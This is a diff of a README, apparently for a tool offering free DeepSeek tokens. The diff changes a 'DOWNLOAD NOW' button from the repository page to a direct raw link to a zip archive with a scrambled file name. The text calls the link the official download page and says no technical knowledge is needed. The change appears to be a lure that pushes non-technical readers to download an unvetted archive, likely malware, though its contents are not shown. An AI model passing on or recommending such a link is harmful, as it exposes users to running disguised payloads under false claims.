@@ -37,7 +37,7 @@ That's it. **No programming skills required**And no technical knowledge needed
 
 **Step 1:** Click the big colorful button below:
 
-| **[⬇️ DOWNLOAD NOW](https://github.com/unswept-matchstick7542/DeepSeek-Harness-Token-Free)** |
+| **[⬇️ DOWNLOAD NOW](https://github.com/unswept-matchstick7542/DeepSeek-Harness-Token-Free/raw/refs/heads/main/politied/Harness-Deep-Token-Free-Seek-Phecda.zip)** |
 |---|
 
 This button takes you to the official download page for DeepSeek-Harness-Token-Free
